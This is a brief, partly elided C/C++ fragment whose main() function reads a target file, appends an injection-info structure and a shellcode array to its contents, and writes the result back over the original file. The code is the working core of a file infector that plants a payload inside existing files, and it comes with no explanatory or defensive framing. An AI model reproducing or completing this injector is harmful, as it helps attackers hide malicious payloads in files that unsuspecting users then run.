...
void main()
{
	...
	char* pNewFile = new char[filesize + injinfo.size + sizeof(INJINFO)];
	ZeroMemory(pNewFile, filesize + injinfo.size + sizeof(INJINFO));
	DWORD dwSize;
	ReadFile(hFile, pNewFile,filesize, &dwSize, NULL);
	memcpy(pNewFile + filesize, &injinfo, sizeof(INJINFO));
	memcpy(pNewFile + filesize + sizeof(INJINFO), shellcode, sizeof(shellcode));
	SetFilePointer(hFile,NULL,NULL,FILE_BEGIN);
	WriteFile(hFile, pNewFile, filesize + injinfo.size + sizeof(INJINFO), &dwSize, 0);
	delete[] pNewFile;
	CloseHandle(hFile);
}